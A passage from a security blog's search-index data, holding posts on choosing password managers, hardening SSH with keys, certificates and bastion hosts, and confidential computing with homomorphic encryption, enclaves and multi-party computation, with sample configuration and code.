backups, PIN management, and not bricking the thing during a rushed \u0026ldquo;quick change\u0026rdquo;.\nReality check:\nMost organizations don\u0026rsquo;t need HSMs. They need to stop putting passwords in git repositories.\nHSMs solve a real problem (protecting private keys), but that\u0026rsquo;s not most people\u0026rsquo;s problem. Most breaches happen because someone committed AWS credentials to a public repo.\nWhat You Actually Need For personal use: KeePassXC or Bitwarden.\nFor a small team (under 20): Bitwarden Organizations.\nFor a larger team (20-100): Bitwarden Organizations or Passbolt (if compliance matters).\nFor infrastructure secrets: Start with cloud provider secrets manager. Move to Vault/OpenBao when you need dynamic credentials.\nFor signing keys / CA keys: YubiHSM if you\u0026rsquo;re serious about security. Software keys are probably fine otherwise.\nMigration Tips LastPass to Bitwarden: Export from LastPass as CSV. Import to Bitwarden. Delete LastPass account. Takes 10 minutes.\nKeePass to Bitwarden: Export KeePass database as CSV. Import to Bitwarden. Keep KeePass database as backup. Sync issues go away.\nNo password manager to Bitwarden: Install browser extension. Save passwords as you log in. Takes a month to capture everything. Worth it.\nHardcoded secrets to Vault: This is the painful one. Requires code changes. Do it gradually:\nIdentify all hardcoded secrets Move to environment variables first (intermediate step) Migrate environment variables to Vault Update apps to fetch from Vault Don\u0026rsquo;t try to do it all at once. One service at a time.\nCommon Mistakes Storing infrastructure secrets in team password manager:\nDon\u0026rsquo;t put your production database password in Bitwarden alongside the marketing team\u0026rsquo;s social media logins.\nHumans access Bitwarden. Machines access Vault. Keep them separate.\nNot rotating credentials after migration:\nMigrated from LastPass to Bitwarden? Great. Did you change all the passwords?\nNo? Someone with access to the old export can still log in.\nRotation is boring. It\u0026rsquo;s also necessary.\nOver-engineering personal password management:\nYou don\u0026rsquo;t need Vault for your Netflix password. You need KeePassXC or Bitwarden.\nVault is for infrastructure. It\u0026rsquo;s overkill for personal use.\nUnder-engineering infrastructure secrets:\nStoring production database passwords in a text file on the server is not a secrets management strategy.\nIf your app can read the file, so can an attacker who compromises the app.\nThe Boring Truth Most password security problems aren\u0026rsquo;t technology problems. They\u0026rsquo;re process problems.\nReal issues:\nPasswords shared via Slack DMs Sticky notes on monitors Same password for everything Never rotating credentials Not using a password manager at all Not real issues:\nWhich password manager you picked Self-hosted vs cloud Open source vs proprietary Pick any decent password manager. Use it. That\u0026rsquo;s 90% of the battle.\nThe remaining 10% is operational discipline. Rotate credentials. Don\u0026rsquo;t share passwords in Slack. Use unique passwords. Enable 2FA.\nWhat\u0026rsquo;s Coming Passkeys:\nFIDO2/WebAuthn passkeys are finally getting traction. 1Password, Bitwarden, and others can sync them across devices.\nThey\u0026rsquo;re good because they remove the password from the phishing equation. A passkey won\u0026rsquo;t sign in to evil-example.com because the origin doesn\u0026rsquo;t match.\nThey still aren\u0026rsquo;t a full replacement for passwords yet:\nYou still need recovery flows (people lose phones) Many services still fall back to \u0026ldquo;email link\u0026rdquo; or SMS (which attackers love) Enterprises still need lifecycle management (joiners/movers/leavers) So yes, use passkeys where you can. You still need a password manager because you\u0026rsquo;ll be living in the hybrid world for years.\nAutomated rotation:\nVault and cloud providers are getting better at automatic credential rotation.\nInstead of rotating database passwords manually every 90 days, Vault rotates them automatically every 24 hours.\nThis is the future. Also requires apps that handle credential rotation gracefully (most don\u0026rsquo;t).\nBetter integration:\nPassword managers are integrating with SSH, git, and other tools.\n1Password SSH agent: Store SSH keys in 1Password, use them transparently. No keys on disk.\nThis is excellent for security. It\u0026rsquo;s also new enough that it breaks occasionally.\nBottom Line For most people: Bitwarden (free, works everywhere, open source).\nFor infrastructure: Cloud provider secrets manager to start, Vault/OpenBao when you need dynamic credentials.\nFor personal use if you don\u0026rsquo;t trust clouds: KeePassXC (local, you control everything).\nFor teams with compliance requirements: Passbolt (self-hosted, detailed audit logs).\nFor signing/CA keys: YubiHSM if you\u0026rsquo;re serious, software keys otherwise.\nDon\u0026rsquo;t overthink it. Pick one. Use it. That\u0026rsquo;s infinitely better than password reuse or sticky notes.\n","date":"15 Apr 2025","permalink":"https://gazsecops.github.io/posts/password-managers-2025/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e \u0026ldquo;We need a password manager for a team.\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e \u0026ldquo;Which one?\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e \u0026ldquo;The secure one.\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e \u0026ldquo;They\u0026rsquo;re all secure. What do you actually need it to do?\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e \u0026ldquo;\u0026hellip;store passwords?\u0026rdquo;\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eThis conversation happens constantly. Organizations pick password managers the same way they pick any security tool - based on vendor pitch decks and analyst reports, not actual requirements.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Password managers solve different problems. KeePassXC for personal use, Bitwarden for teams, Vault for infrastructure. Pick based on what you're protecting and who needs access, not which one has the best marketing.\"\n\u003c/aside\u003e\n\u003cp\u003eThe password manager landscape in 2025 splits into three categories: personal password managers, team password managers, and infrastructure secrets management. They\u0026rsquo;re not interchangeable.\u003c/p\u003e","tags":["security","passwords","vault","linux","operations"],"title":"Password Managers in 2025: What Actually Works"},{"content":" Sysadmin: I\u0026rsquo;ve hardened SSH. Disabled root login, changed the port, installed fail2ban.\nEngineer: Changed the port?\nSysadmin: Yeah, moved it to 2222. Security through obscurity.\nEngineer: A port scan takes four seconds. What about certificate auth?\nSysadmin: What about what?\nSSH hardening advice on the internet falls into two categories: the stuff that doesn\u0026rsquo;t matter (change the port, install fail2ban, add a banner) and the stuff that does matter but nobody explains properly (certificate auth, key management, agent forwarding risks, auditing).\nThis post is about the second category.\nThe threat isn't someone brute-forcing your SSH port. It's the key that's been sitting in a developer's home directory since 2019, with no passphrase, copied to six machines. If you\u0026rsquo;re running Linux servers - on-prem, cloud, doesn\u0026rsquo;t matter - SSH is your management plane. If SSH is compromised, everything behind it is compromised. Treat it accordingly.\nWhat Doesn\u0026rsquo;t Matter (Much) Get these out of the way so we can focus on what does.\nChanging the port: Stops automated scanners. Doesn\u0026rsquo;t stop anyone who\u0026rsquo;s actually targeting you. A full port scan takes seconds. If this is your hardening strategy, you don\u0026rsquo;t have a hardening strategy.\nLogin banners: Legal requirement in some jurisdictions. Zero security value. Nobody has ever been stopped by \u0026ldquo;Unauthorised access is prohibited\u0026rdquo;.\nfail2ban (alone): Bans IPs after failed attempts. Fine for reducing log noise. Useless against an attacker using a botnet with thousands of IPs, or one who has a valid key.\nThese aren\u0026rsquo;t harmful. They\u0026rsquo;re just not where the risk is.\nWhat Actually Matters 1. Key-based auth only. No passwords. This is the minimum. If you still allow password auth over SSH, fix that first before reading the rest.\n# /etc/ssh/sshd_config PasswordAuthentication no KbdInteractiveAuthentication no UsePAM yes Keep UsePAM yes for session management and account controls, but make sure PAM isn\u0026rsquo;t configured to fall back to password auth for SSH.\nWhy this matters: password auth is brute-forceable. Key auth isn\u0026rsquo;t (assuming reasonable key sizes). A 4096-bit RSA key or an Ed25519 key is not getting brute-forced.\n2. Use Ed25519 keys RSA works. Ed25519 is better.\nssh-keygen -t ed25519 -C \u0026#34;you@hostname\u0026#34; Ed25519 keys are:\nSmaller (68 characters vs 400+ for RSA 4096) Faster to verify Not susceptible to the same implementation pitfalls as ECDSA (no random number problems) Supported everywhere that matters (OpenSSH 6.5+, which is ancient now) If you need RSA for compatibility with something old, use 4096-bit minimum. If you\u0026rsquo;re generating 2048-bit RSA keys in 2025, stop.\n3. Passphrase-protect your keys A private key without a passphrase is a plaintext credential sitting on disk.\nIf someone gets access to a developer\u0026rsquo;s laptop - stolen, malware, whatever - an unprotected private key gives them access to every server that trusts it.\n# Add passphrase to existing key ssh-keygen -p -f ~/.ssh/id_ed25519 Use ssh-agent so you don\u0026rsquo;t have to type it every time:\neval \u0026#34;$(ssh-agent -s)\u0026#34; ssh-add ~/.ssh/id_ed25519 The agent holds the decrypted key in memory for the session. You type the passphrase once. The key on disk stays encrypted.\n4. Lock down sshd_config A sane baseline:\n# Authentication PermitRootLogin no PasswordAuthentication no KbdInteractiveAuthentication no PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys MaxAuthTries 3 AuthenticationMethods publickey PermitEmptyPasswords no PermitUserEnvironment no StrictModes yes # Restrict users AllowUsers deploy monitoring admin # Or use groups: # AllowGroups ssh-users # Network ListenAddress 10.0.1.5 AddressFamily inet # Session ClientAliveInterval 300 ClientAliveCountMax 2 MaxSessions 3 # Forwarding (disable what you don\u0026#39;t need) AllowTcpForwarding no AllowAgentForwarding no X11Forwarding no GatewayPorts no PermitTunnel no # Crypto KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256 Notes:\nPermitRootLogin no - always. Use sudo. AllowUsers or AllowGroups - explicit allowlist. If you\u0026rsquo;re not on the list, you don\u0026rsquo;t connect. Full stop. ListenAddress - bind to the management interface, not 0.0.0.0 Forwarding defaults to off. Enable per-user or per-host only where needed. Crypto choices drop everything weak. If something can\u0026rsquo;t connect with these, it\u0026rsquo;s old enough to be a problem itself. If you\u0026rsquo;re on a modern distro, prefer drop-in config instead of editing the main file:\n/etc/ssh/sshd_config.d/10-hardening.conf And to see the effective config (after includes and defaults):\nsshd -T | sort After changing sshd_config, always:\nsshd -t # test config before reloading systemctl reload sshd And keep your existing session open until you\u0026rsquo;ve confirmed the new config works. Locking yourself out of your own server is a rite of passage, but only the first time.\n5. authorized_keys hygiene This is where most SSH deployments rot.\n~/.ssh/authorized_keys accumulates keys over time. People leave. Keys aren\u0026rsquo;t removed. Nobody audits.\nProblems:\nEx-employees still have access Keys copied between machines (one compromised key opens many doors) No way to tell which key belongs to whom without comments No expiry Minimum hygiene:\nEvery key gets a comment identifying the owner and purpose Review authorized_keys quarterly (automate this) Remove keys for anyone who\u0026rsquo;s left or changed role One key per person per use case (don\u0026rsquo;t reuse keys across purposes) Also: file permissions matter. If your .ssh directory is writable by group/other, sshd will ignore it (or should).\nchmod 700 ~/.ssh chmod 600 ~/.ssh/authorized_keys # Audit: show fingerprints and comments for keyfile in /home/*/.ssh/authorized_keys; do [ -f \u0026#34;$keyfile\u0026#34; ] || continue echo \u0026#34;=== $keyfile ===\u0026#34; while IFS= read -r line; do # Skip blanks and comments [ -z \u0026#34;$line\u0026#34; ] \u0026amp;\u0026amp; continue case \u0026#34;$line\u0026#34; in \\#*) continue ;; esac # Print fingerprint and comment for each key line fp=$(printf \u0026#39;%s\\n\u0026#39; \u0026#34;$line\u0026#34; | ssh-keygen -lf /dev/stdin 2\u0026gt;/dev/null | awk \u0026#39;{print $2}\u0026#39;) comment=$(printf \u0026#39;%s\\n\u0026#39; \u0026#34;$line\u0026#34; | awk \u0026#39;{print $NF}\u0026#39;) echo \u0026#34;$fp $comment\u0026#34; done \u0026lt; \u0026#34;$keyfile\u0026#34; done Run that on every server. You\u0026rsquo;ll find keys you can\u0026rsquo;t explain. Remove them.\n6. SSH certificates (the thing most people skip) SSH certificates solve the authorized_keys problem properly.\nInstead of distributing public keys to every server, you:\nRun an SSH CA (just a key pair, not complicated) Sign user keys with the CA Servers trust the CA, not individual keys Certificates have an expiry Set up a CA:\n# Generate CA key (keep this safe - offline if possible) ssh-keygen -t ed25519 -f /etc/ssh/ca_user_key -C \u0026#34;SSH User CA\u0026#34; Sign a user\u0026rsquo;s key:\n# Sign for 8 hours, restrict to specific principals ssh-keygen -s /etc/ssh/ca_user_key \\ -I \u0026#34;alice-laptop\u0026#34; \\ -n alice,deploy \\ -V +8h \\ alice_id_ed25519.pub This creates alice_id_ed25519-cert.pub - a certificate that:\nIs valid for 8 hours Identifies as \u0026ldquo;alice-laptop\u0026rdquo; Allows login as alice or deploy Is signed by your CA Configure servers to trust the CA:\n# /etc/ssh/sshd_config TrustedUserCAKeys /etc/ssh/ca_user_key.pub Now any key signed by your CA is trusted. No authorized_keys file needed. When the certificate expires, access stops. When someone leaves, stop signing their keys. Done.\nWhy this is better:\nNo authorized_keys sprawl Certificates expire (short-lived = less risk) Centralised control (revoke by not re-signing) Audit trail (who signed what, when, for how long) Principals restrict which accounts a cert can access If you want this automated, step-ca can issue SSH certificates alongside TLS ones. See the step-ca post for the setup.\nHost certificates (fixes known_hosts rot):\nYou can also sign server host keys, so clients trust the host CA instead of \u0026ldquo;type yes to trust this random new key\u0026rdquo;.\nCreate a host CA (offline if you can):\nssh-keygen -t ed25519 -f /etc/ssh/ca_host_key -C \u0026#34;SSH Host CA\u0026#34; Sign a host key (run on the CA machine):\nssh-keygen -s /etc/ssh/ca_host_key \\ -I \u0026#34;host-internal-db01\u0026#34; \\ -h \\ -n internal-db01,internal-db01.internal \\ -V +52w \\ /etc/ssh/ssh_host_ed25519_key.pub On the server, point sshd at the host certificate:\n# /etc/ssh/sshd_config HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub On the client side, trust the host CA once:\n# ~/.ssh/known_hosts @cert-authority *.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...host-ca-public... This is the difference between \u0026ldquo;TOFU forever\u0026rdquo; and \u0026ldquo;hosts are authenticated like grown-ups\u0026rdquo;.\n7. Bastion / jump host patterns Don\u0026rsquo;t expose SSH on every server to the internet. Or even to your whole internal network.\nPattern: bastion host\n[You] --\u0026gt; [Bastion] --\u0026gt; [Internal servers] Bastion is the only host with SSH exposed Internal servers only accept SSH from the bastion Bastion logs everything Bastion has no other purpose (no apps, no data) SSH config for jumping through a bastion:\n# ~/.ssh/config Host bastion HostName bastion.example.com User admin IdentityFile ~/.ssh/id_ed25519 Host internal-* ProxyJump bastion User deploy IdentityFile ~/.ssh/id_ed25519 Now ssh internal-db01 automatically jumps through the bastion. No manual two-step.\nProxyJump vs agent forwarding:\nUse ProxyJump. Don\u0026rsquo;t use agent forwarding.\nAgent forwarding (ssh -A) puts your SSH agent socket on the remote host. Anyone with root on that host can use your agent to authenticate as you to other systems.\nProxyJump tunnels the connection through the bastion without exposing your agent. Same result, none of the risk.\n# Bad: agent forwarding ssh -A bastion ssh internal-db01 # bastion admin could hijack your agent # Good: ProxyJump ssh -J bastion internal-db01 # agent never touches bastion If you have AllowAgentForwarding yes in your sshd_config and you don\u0026rsquo;t have a specific reason for it, turn it off.\n8. Audit: who did what SSH access without audit logging is access without accountability.\nsshd logging:\n# /etc/ssh/sshd_config LogLevel VERBOSE VERBOSE logs key fingerprints on auth. You can tie a login to a specific key. INFO (the default) doesn\u0026rsquo;t.\nSession logging with auditd:\n# Watch for changes to SSH config auditctl -w /etc/ssh/sshd_config -p wa -k sshd_config auditctl -w /etc/ssh/sshd_config.d -p wa -k sshd_config # Watch for changes to authorised keys (pick the paths that exist in your environment) auditctl -w /home -p wa -k ssh_authorized_keys auditctl -w /root/.ssh -p wa -k ssh_authorized_keys Command logging via execve is possible, but it\u0026rsquo;s noisy and it captures everything (including secrets in command lines). If you need session recording, use a tool designed for it and test the storage/retention.\nTo query audit events:\nausearch -k sshd_config -i | less ausearch -k ssh_authorized_keys -i | less What to send to your log collector:\nAuthentication events (success and failure) Key fingerprints (which key was used) Source IPs Session start/end Commands executed (if your policy requires it) If someone compromises a server via SSH, you need to answer: which key, from which IP, at what time, and what did they do? Without audit logging, you\u0026rsquo;re guessing.\nCloud SSH Cloud providers add their own wrinkles.\nAWS Use EC2 Instance Connect or SSM Session Manager instead of direct SSH where you can If you use SSH keys, rotate them (AWS doesn\u0026rsquo;t do this for you) Security groups should restrict SSH to bastion or VPN, not 0.0.0.0/0 Use IMDSv2 (hop limit 1) so a compromised app can\u0026rsquo;t grab instance credentials and pivot Azure Azure Bastion provides browser-based SSH without exposing port 22 Microsoft Entra ID SSH login lets you authenticate with your corporate identity instead of keys NSG rules should restrict SSH source IPs Just-in-time VM access opens the port only when needed GCP OS Login ties SSH to Google identities (no manual key management) IAP (Identity-Aware Proxy) tunnels SSH through Google\u0026rsquo;s infrastructure without exposing port 22 Use OS Login over project-wide SSH keys (project keys are a shared credential problem) The pattern is the same everywhere: don\u0026rsquo;t expose SSH to the internet, use identity-based auth where you can, and audit everything.\nWhat Breaks Old keys nobody removes The number one SSH security problem. Someone leaves the company. Their key stays in authorized_keys on thirty servers. Nobody notices.\nFix: SSH certificates (they expire) or automated authorized_keys management (pull from a central source, remove stale keys).\nShared keys A \u0026ldquo;deploy key\u0026rdquo; used by twelve people and three CI systems. Stored in a shared drive. Copied to laptops. No passphrase.\nIf this key is compromised, which it probably already is, you don\u0026rsquo;t know who used it for what.\nFix: one key per person, one key per service. Certificate auth if you can.\nAgent forwarding to untrusted hosts Developers SSH to a shared dev box with agent forwarding. Root on the dev box can hijack their agent and access production.\nFix: ProxyJump. Turn off AllowAgentForwarding.\nStale known_hosts Server gets rebuilt. Host key changes. Someone types \u0026ldquo;yes\u0026rdquo; without thinking. Now they might be connecting to the wrong thing.\nFix: host certificates (servers get certs signed by a CA, clients trust the CA, no more TOFU). Or at minimum, distribute known_hosts centrally.\nThe Boring Truth SSH hardening is not about changing the port or installing fancy tools. It\u0026rsquo;s about:\nKey management (who has keys, where, and are they protected?) Access control (who can connect to what, and is it the minimum needed?) Certificates (if you can, because they solve the lifecycle problem) Audit (who connected, with which key, and what did they do?) Bastion patterns (reduce the attack surface to one well-monitored entry point) None of this is exciting. All of it matters more than the port number.\nFor the PKI side of SSH certificates and how to automate issuance, see the step-ca post. For incident response when SSH access is compromised, the IR post covers containment and investigation. For monitoring the signals that tell you something\u0026rsquo;s wrong, see the Prometheus post.\n","date":"18 Mar 2025","permalink":"https://gazsecops.github.io/posts/ssh-hardening-what-actually-matters/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e I\u0026rsquo;ve hardened SSH. Disabled root login, changed the port, installed fail2ban.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e Changed the port?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Yeah, moved it to 2222. Security through obscurity.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e A port scan takes four seconds. What about certificate auth?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What about what?\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eSSH hardening advice on the internet falls into two categories: the stuff that doesn\u0026rsquo;t matter (change the port, install fail2ban, add a banner) and the stuff that does matter but nobody explains properly (certificate auth, key management, agent forwarding risks, auditing).\u003c/p\u003e\n\u003cp\u003eThis post is about the second category.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nThe threat isn't someone brute-forcing your SSH port. It's the key that's been sitting in a developer's home directory since 2019, with no passphrase, copied to six machines.\n\u003c/aside\u003e\n\u003cp\u003eIf you\u0026rsquo;re running Linux servers - on-prem, cloud, doesn\u0026rsquo;t matter - SSH is your management plane. If SSH is compromised, everything behind it is compromised. Treat it accordingly.\u003c/p\u003e","tags":["security","ssh","linux","operations","hardening"],"title":"SSH Hardening: What Actually Matters"},{"content":" CISO: Our data never leaves the network. Encrypted at rest, encrypted in transit. We\u0026rsquo;re covered.\nEngineer: What happens when we need to process it?\nCISO: We decrypt it, process it, encrypt it again. Standard procedure.\nEngineer: What if we could process it without ever decrypting it?\nCISO: Impossible. You can\u0026rsquo;t do math on encrypted data.\n\"The revolution isn't preventing access to data. It's processing data you never access.\" Traditional encryption works by keeping data secret until you need it. Decrypt, process, encrypt again. It\u0026rsquo;s worked for decades. But it has a fundamental limitation: at some point, the data must be exposed in plaintext.\nConfidential computing flips this on its head. Instead of protecting data by controlling who can access it, we protect data by ensuring it\u0026rsquo;s never accessible in plaintext at all. Even during processing.\nThis isn\u0026rsquo;t theoretical. Companies are using it today. Financial analytics on encrypted transactions. Healthcare processing without seeing patient records. Collaborative fraud detection between competitors without sharing raw data.\nWhat Confidential Computing Actually Is Confidential computing is about processing encrypted data without decrypting it. Three main approaches:\n1. Homomorphic Encryption Mathematical encryption that allows computations on ciphertexts that, when decrypted, produce the same result as if you\u0026rsquo;d performed the operation on plaintexts.\nHow it works:\nEncrypt data using special cryptographic scheme Perform mathematical operations directly on encrypted values Decrypt the result The decrypted result is mathematically identical to what you\u0026rsquo;d get by decrypting first, then computing The breakthrough: This has been theoretically possible for decades (Gentry\u0026rsquo;s fully homomorphic encryption proved it in 2009). But it was computationally prohibitive - millions of times slower than normal processing. Recent advances in schemes like CKKS (Cheon-Kim-Kim-Song) made it practical for real-world workloads.\nTools available today:\nMicrosoft SEAL - C++ library for homomorphic encryption TenSEAL - Python bindings for SEAL OpenMined PySyft - Private ML framework (privacy-preserving ML, MPC-style workflows) IBM HElib - Homomorphic encryption library 2. Secure Enclaves (Trusted Execution Environments) Hardware-isolated regions of memory where code and data are protected even from the operating system and hypervisor.\nHow it works:\nCPU creates encrypted memory region (enclave) Only code running inside enclave can decrypt data CPU validates code integrity before allowing execution External observers (even OS, hypervisor, cloud provider) cannot see inside Real-world implementations:\nIntel SGX - Software Guard Extensions AMD SEV - Secure Encrypted Virtualization AWS Nitro Enclaves - Isolated VMs in AWS Google Confidential VMs - AMD SEV-based GCP offering Azure Confidential Computing - Multiple TEE options 3. Multi-Party Computation (MPC) Multiple parties jointly compute a function over their inputs while keeping those inputs private. No single party ever sees another\u0026rsquo;s data.\nHow it works:\nEach participant splits their data into shares Shares distributed among participants Computation performed on shares, not raw data Final result reconstructed only when all parties combine their output shares No single share reveals anything about original data Use cases:\nJoint fraud detection between banks (without sharing customer data) Clinical trials across hospitals (without exposing patient records) Salary surveys (without revealing individual salaries) Auctions (without revealing bids) Real-World Use Cases Use Case 1: Financial Analytics on Encrypted Transactions Problem: Bank wants to analyze transaction patterns for fraud detection, but cannot expose customer data due to strict regulations (GDPR, PSD2).\nTraditional approach: Decrypt all transactions, run analytics, hope nobody leaks data.\nConfidential computing approach:\nTransactions remain encrypted at all times Fraud detection model runs on encrypted transactions using homomorphic encryption Only flagged transactions are flagged (with proper warrants for decryption if needed) Benefits:\nRegulatory compliance built in Reduced attack surface (plaintext never exists) Can outsource analytics to third parties without data exposure Audit trail shows data was never decrypted Tools: Microsoft SEAL + custom fraud detection algorithms\nUse Case 2: Healthcare Processing Without Seeing Patient Records Problem: Hospital wants to use AI for diagnosis, but cannot share patient records with external AI vendors due to HIPAA and patient privacy laws.\nTraditional approach: Anonymize data (often insufficient), send to vendor, hope nobody re-identifies patients.\nConfidential computing approach:\nPatient records encrypted and sent to secure enclave AI model runs inside enclave on encrypted data Only diagnosis output leaves enclave Hospital receives encrypted diagnosis, decrypts locally Benefits:\nHIPAA compliance by design Vendor never sees patient data (even in plaintext inside enclave) Enables use of third-party AI models without data sharing Patients can verify their data was never exposed Tools: Intel SGX enclaves + TensorFlow/PyTorch support\nUse Case 3: Collaborative Fraud Detection Between Competitors Problem: Multiple banks want to detect fraud rings that span institutions, but cannot share customer data with competitors.\nTraditional approach: Nothing. Data silos prevent collaboration. Fraud rings exploit this.\nConfidential computing approach:\nEach bank encrypts their transaction data Using MPC, banks jointly run fraud detection algorithm No bank ever sees another\u0026rsquo;s raw data Only cross-institutional fraud patterns are identified Benefits:\nDetects fraud rings that span institutions Zero data sharing between competitors Regulatory compliant (no customer data leaves bank) Collective intelligence without collective exposure Tools: OpenMined PySyft + custom MPC protocols\nThe Killer Feature: Compute on Encrypted Data Here\u0026rsquo;s why this matters:\nTraditional encryption:\nDecrypt → Process → Encrypt ↑ ↓ Exposure happens here Confidential computing:\nProcess on encrypted data ↓ No exposure at any point This isn\u0026rsquo;t just incremental security. It\u0026rsquo;s a paradigm shift.\nBefore: Security was about controlling who could access data (access control, encryption keys, secure networks).\nNow: Security is about never exposing data in plaintext at all, regardless of who wants to access it.\nThe data stays secret. You still get useful results. The mathematics of encryption and the isolation of hardware make it possible to compute without knowing.\nPractical Implementation Getting Started with Microsoft SEAL Microsoft SEAL is probably the easiest entry point into homomorphic encryption. C++ library with Python bindings (TenSEAL) and excellent documentation.\nInstall:\npip install tenseal # or compile SEAL from source for C++ Basic example: Computing average of encrypted numbers\nimport tenseal as ts # Setup encryption parameters context = ts.context( ts.SCHEME_TYPE.CKKS, poly_modulus_degree=8192, coeff_mod_bit_sizes=[60, 40, 40, 60] ) context.global_scale = 2**40 context.generate_galois_keys() # Encrypt some numbers encoder = ts.CKKSEncoder(context) numbers = [10.5, 20.3, 30.1, 40.9, 50.2] encrypted = ts.ckks_vector(context, numbers) # Compute sum (homomorphic addition) encrypted_sum = encrypted.sum() sum_result = encrypted_sum.decrypt()[0] # Compute average (homomorphic division) num_elements = len(numbers) encrypted_average = encrypted_sum / num_elements average_result = encrypted_average.decrypt()[0] print(f\u0026#34;Sum: {sum_result}\u0026#34;) # 152.0 print(f\u0026#34;Average: {average_result}\u0026#34;) # 30.4 What\u0026rsquo;s happening:\nNumbers are encrypted Sum and average computed on encrypted values Results decrypted only at the end Plaintext numbers never exposed during computation Getting Started with Intel SGX Enclaves SGX enclaves require Intel SGX-capable hardware and some setup, but once running, they\u0026rsquo;re straightforward to use.\nPrerequisites:\nIntel SGX-capable CPU SGX driver installed Intel SGX SDK Docker with SGX support Basic enclave example (illustrative):\n// enclave.edl - Enclave Definition File enclave { trusted { public void process_sensitive_data([in, out, size=len] char* data, size_t len); }; untrusted { }; }; // enclave.c - Code running inside enclave #include \u0026#34;enclave_t.h\u0026#34; #include \u0026lt;string.h\u0026gt; void process_sensitive_data(char* data, size_t len) { // This runs inside encrypted memory // OS cannot see what\u0026#39;s happening here // Even hypervisor cannot see inside // Toy example: reverse the input buffer in-place // Real-world: the hard part is key handling and attestation, not string tricks. for (size_t i = 0; i \u0026lt; len / 2; i++) { char tmp = data[i]; data[i] = data[len - 1 - i]; data[len - 1 - i] = tmp; } // Result leaves enclave as output // Input data stays encrypted and inaccessible } // app.c - Untrusted application #include \u0026#34;enclave_u.h\u0026#34; #include \u0026#34;sgx_urts.h\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { sgx_enclave_id_t eid; sgx_launch_token_t token = {0}; int updated = 0; // Create enclave sgx_status_t status = sgx_create_enclave( \u0026#34;enclave.signed.so\u0026#34;, SGX_DEBUG_FLAG, \u0026amp;token, \u0026amp;updated, \u0026amp;eid, NULL ); if (status != SGX_SUCCESS) { printf(\u0026#34;Failed to create enclave: 0x%x\\n\u0026#34;, status); return 1; } // Data to process char sensitive_data[] = \u0026#34;This is sensitive\u0026#34;; // Send to enclave for processing status = process_sensitive_data(eid, sensitive_data, strlen(sensitive_data)); if (status != SGX_SUCCESS) { printf(\u0026#34;ECALL failed: 0x%x\\n\u0026#34;, status); sgx_destroy_enclave(eid); return 1; } printf(\u0026#34;Result: %s\\n\u0026#34;, sensitive_data); // Data was processed inside enclave // Never exposed in plaintext outside enclave sgx_destroy_enclave(eid); return 0; } Key point: Everything in enclave.c runs in encrypted memory. The application in app.c can call it, but cannot see inside.\nGetting Started with PySyft (Reality Check) If you\u0026rsquo;ve seen PySyft examples using TorchHook, VirtualWorker, and .send(), they\u0026rsquo;re from old versions.\nPySyft is still a real project, but the API has moved around over the years. Treat it like a platform you adopt, not a snippet you paste into a notebook.\nThe basic workflow you are aiming for looks like this:\nData stays with each data owner (hospital A, hospital B, etc.) You send a training job to each owner (or run it in their environment) You only get back what you agreed you can get back (aggregates, gradients, or a trained model) You can prove - or at least strongly argue - that raw data never left If you want this in production, decide early what you actually need:\nA trained model that never saw raw data Aggregated analytics (counts, averages, cohorts) Joint detection (\u0026ldquo;is this transaction in your fraud set?\u0026rdquo;) Then pick the tool that matches. MPC-style systems tend to be opinionated about deployment and orchestration. That\u0026rsquo;s not a bug.\nChallenges and Limitations Performance Overhead Homomorphic encryption is slower than plaintext computation.\nReality check (ballpark):\nTEEs (enclaves / confidential VMs): often within single-digit to low double-digit percent of native, but you pay in complexity (attestation, images, debugging) MPC: depends on number of parties and network. You can make it fast, or you can make it private. Pick one, then compromise. Homomorphic encryption: still slow. For anything beyond toy arithmetic, expect orders of magnitude overhead. Mitigation:\nChoose right tool for right job (enclaves faster than homomorphic encryption) Batch computations when possible Use hybrid approaches (encrypt what matters, keep other things normal) Leverage hardware acceleration where available Complexity Implementing confidential computing requires specialized knowledge.\nChallenges:\nCryptographic expertise for homomorphic encryption Hardware-specific code for enclaves Protocol design for MPC Integration with existing systems Mitigation:\nUse mature libraries (SEAL, PySyft, etc.) Start with use cases where value exceeds complexity cost Leverage managed services (AWS Nitro, Azure Confidential Computing) Build internal expertise gradually Not Universal Confidential computing isn\u0026rsquo;t a silver bullet.\nDoesn\u0026rsquo;t work for:\nAll data types (some structures don\u0026rsquo;t map well) All algorithms (some require random access patterns incompatible with encryption) Real-time systems where latency is critical (yet) Workloads where data must be combined from unencrypted sources Best for:\nBatch analytics on sensitive data ML model training on private datasets Cross-organization collaboration Regulatory-heavy environments 